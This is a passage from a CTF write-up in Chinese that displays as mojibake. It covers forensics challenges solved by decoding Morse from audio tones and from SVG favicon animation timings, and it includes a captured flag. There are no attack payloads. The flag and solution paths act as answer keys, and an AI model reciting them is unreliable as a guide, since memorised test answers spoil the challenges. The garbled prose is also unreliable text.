åˆ‡å‡ºæ¥ä¹‹åä¸€å¬å°±æ˜¯ä¸€äº›å˜€å˜€å˜€çš„å£°éŸ³ï¼Œä¼°è®¡æ˜¯è«å°”æ–¯ç”µç äº†ã€‚ä¸è¿‡è¿™ä¸ªé˜¶æ®µAuditionçš„é¢‘è°±åˆ†æåŠŸèƒ½è¿˜æ˜¯å¾ˆå¼ºå¤§çš„ï¼ˆUIå¥½çœ‹å¾ˆå¤šï¼‰ï¼Œå¯ä»¥å‘ç°å˜€å˜€å˜€çš„å£°éŸ³åŸºæœ¬éƒ½æ˜¯440Hzçš„ï¼Œå¯ä»¥å¸¦é€šæ»¤æ³¢åˆ‡å‡ºæ¥ç„¶åè‚‰çœ¼çœ‹
```
..-/-/..-./.-../.-/--./.-../-----/...-/...--/-/..../....-/-/-../.-/-./-.-./...--
U T F L A G L 0 V 3 T H 4 T D A N C 3 
```
`utflag{l0v3th4tdanc3}`

### Forensics: Gibberish

å‚è€ƒï¼š[https://meashiri.github.io/ctf-writeups/posts/202403-utctf/#insanity-check-reimagined](https://meashiri.github.io/ctf-writeups/posts/202403-utctf/#insanity-check-reimagined)

- é¦–å…ˆåº”è¯¥è¦èƒ½å‘ç°å­—æ¯é‡Œæ²¡æœ‰`b,z,t`ã€‚æ‰€ä»¥å¯èƒ½è¿™æ˜¯ä¸€ç§é€Ÿè®°é”®ç›˜ï¼Œæ‰€ä»¥å½“ç„¶ä¸ä¼šæ˜¯å·²çŸ¥çš„ä»»ä½•é”®ç›˜å¸ƒå±€ã€‚å°±è·Ÿé€†å‘è¾“å…¥æ³•çš„è¾“å…¥ä¸€æ ·ã€‚æœç´¢å…³é”®è¯ï¼šstenography on qwertyã€‚æœ‰ä¸ªé€Ÿè®°è½¯ä»¶å«Plover
- å¤šä¸ªé”®åŒæ—¶æŒ‰ä¸‹æ—¶ï¼Œä¼¼ä¹ç®€å•å–æœ€é•¿çš„é‚£ä¸€ç»„å°±è¡Œäº†ï¼Œä½†æ˜¯å½“ä¸€ç»„å¤šäº6ä¸ªé”®æ—¶ï¼Œè¿˜éœ€è¦æ¾å¼€æŒ‰é”®å†æŒ‰ä¸‹ã€‚
- æ€»ä¹‹è¿™ä¸ªé¢˜æ˜¯æŒºæŠ˜ç£¨çš„ï¼Œä¸å‡†å¤‡å¤ç°

### Forensics: Insanity Check: Reimagined

```
A reimagined version of our iconic Insanity Check: Redux challenge from UTCTF 2023.

The flag is in CTFd this time, but, as always, you'll have to work for it.

(Specifically the CTFd instance hosting utctf.live)

(This challenge does not require any brute-force -- as per the rules of the competition, brute-force tools like dirbuster are not allowed, and will not help you here.)

By Alex (@.alex_._ on Discord)
```

è¿™å°±æ˜¯æ‰€è°“çš„ç©¶çº§è—*é¢˜äº†ï¼Œåªå‘Šè¯‰ä½ flagåœ¨è¿™ä¸ªCTFdä¸»ç«™ä¸Šï¼Œæ‰¾å§ï¼

ä¸è¿‡ç¡®å®æ˜¯æˆ‘ç»éªŒå°‘äº†ï¼Œè¿™ä¸ªé¢˜æ­£ç¡®çš„è·¯å¾„åº”è¯¥æ˜¯F12çœ‹è¯·æ±‚äº†ä»€ä¹ˆèµ„æºï¼ˆçœ‹æºä»£ç ä¼šå°‘äº›ä¸œè¥¿ï¼‰ã€‚å¦‚æœèƒ½æ³¨æ„åˆ°`favicon.svg`æ˜¯ä¸ªå¾ˆå¯ç–‘çš„æ–‡ä»¶å°±å¯ä»¥è¿›å…¥ä¸‹ä¸€æ­¥äº†ã€‚

```xml
<svg width="384" height="576" viewBox="0 0 384 576" xmlns="http://www.w3.org/2000/svg" id="root">
<style>
@keyframes blink {
0.000% { fill: #FFFF; }
0.314% { fill: #FFF6; }
0.629% { fill: #FFFF; }
0.943% { fill: #FFF6; }
1.258% { fill: #FFFF; }
2.201% { fill: #FFF6; }
2.516% { fill: #FFF6; }
3.145% { fill: #FFFF; }
4.088% { fill: #FFF6; }
4.403% { fill: #FFF6; }
...
</style>
</svg>
```
å¦‚æœç”»å‡ºé¢œè‰²å˜åŒ–æ‰€åœ¨çš„æ—¶é—´å·®ï¼Œè¿™ä¼¼ä¹æ˜¯æŸç§ç¼–ç ï¼Œå¯èƒ½æ˜¯æ‘©å°”æ–¯ç”µç ã€‚å…·ä½“è§‚å¯Ÿå¯ä»¥è§£ç å‡ºåˆ°åº•å“ªäº›ç»„åˆæ˜¯çŸ­ã€é•¿ã€åˆ†éš”ç¬¦ã€‚
